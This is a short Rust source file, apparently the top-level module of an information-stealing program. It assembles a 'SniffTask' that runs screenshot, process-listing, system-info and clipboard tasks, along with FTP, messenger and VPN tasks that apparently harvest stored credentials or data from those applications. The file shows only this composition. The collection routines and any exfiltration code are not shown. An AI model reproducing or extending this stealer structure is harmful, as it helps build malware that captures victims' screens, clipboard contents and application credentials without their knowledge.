#![no_std]
#![allow(unsafe_op_in_unsafe_fn)]

extern crate alloc;
mod clipboard;
mod processes;
mod screenshot;
mod systeminfo;

use crate::clipboard::ClipboardTask;
use crate::processes::ProcessesTask;
use crate::screenshot::ScreenshotTask;
use crate::systeminfo::SystemInfoTask;
use alloc::vec;
use ftp::FtpTask;
use messengers::MessengersTask;
use tasks::{composite_task, impl_composite_task_runner, CompositeTask, Task};
use vpn::VpnTask;

pub struct SniffTask {
    inner: CompositeTask
}

impl SniffTask {
    pub fn new() -> Self {
        Self {
            inner: composite_task!(
                ScreenshotTask,
                ProcessesTask,
                SystemInfoTask,
                ClipboardTask,
                FtpTask::new(),
                MessengersTask::new(),
                VpnTask::new()
            )
        }
    }
}

impl_composite_task_runner!(SniffTask);